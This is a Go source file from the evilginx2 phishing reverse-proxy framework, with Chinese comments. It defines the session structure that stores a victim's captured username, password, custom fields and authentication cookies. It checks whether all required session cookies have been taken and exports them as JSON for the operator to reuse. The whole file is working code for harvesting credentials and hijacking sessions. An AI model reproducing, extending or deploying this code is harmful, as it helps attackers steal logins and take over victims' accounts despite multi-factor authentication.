package core

import (
	"encoding/json"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

// Session 用于在内存中记录某个受害者会话的数据
type Session struct {
	Id         string
	Name       string
	Username   string
	Password   string
	Custom     map[string]string
	Params     map[string]string
	BodyTokens map[string]string
	HttpTokens map[string]string

	// CookieTokens 存放我们捕获到的 Cookie 信息，每个 domain 下若干个键值对
	CookieTokens map[string]map[string]*database.CookieToken

	// Cookies 用来存储把 CookieTokens 转换为 JSON 后的字符串
	Cookies string

	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
}

// NewSession 新建一个会话对象
func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		CookieTokens:   make(map[string]map[string]*database.CookieToken),
		Cookies:        "",
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
	}
	return s, nil
}

// SetUsername 设置用户名
func (s *Session) SetUsername(username string) {
	s.Username = username
}

// SetPassword 设置密码
func (s *Session) SetPassword(password string) {
	s.Password = password
}

// SetCustom 可存储额外字段，如 "Email" 等
func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

// AddCookieAuthToken 当捕获到某个 domain 下的一条 cookie 时，加入 CookieTokens，并更新 s.Cookies
func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, httpOnly bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	s.CookieTokens[domain][key] = &database.CookieToken{
		Name:     key,
		Value:    value,
		HttpOnly: httpOnly,
		Path:     path,
	}

	// 每次新增/更新 Cookie，都同步刷新 Cookies 字段
	s.Cookies = s.GenerateCookiesJSON()
}

// AllCookieAuthTokensCaptured 用于判断是否已经捕获到了所有需要的 cookie（可自定义逻辑）
func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						// 移除已匹配的 token
						tcopy[domain] = append(al[:an], al[an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	return len(tcopy) == 0
}

// Finish 用于标记该会话已完成
func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}

// GenerateCookiesJSON 将 CookieTokens 转成 JSON 字符串，方便前端直接拿
func (s *Session) GenerateCookiesJSON() string {
	var cookieList []map[string]interface{}

	for domain, tokens := range s.CookieTokens {
		for key, token := range tokens {
			cookie := map[string]interface{}{
				"domain":   domain,
				"name":     key,
				"value":    token.Value,
				"httpOnly": token.HttpOnly,
				// 也可以存 expires, 这里仅示例
				"path": token.Path,
			}
			cookieList = append(cookieList, cookie)
		}
	}

	jsonBytes, err := json.Marshal(cookieList)
	if err != nil {
		return "[]"
	}
	return string(jsonBytes)
}
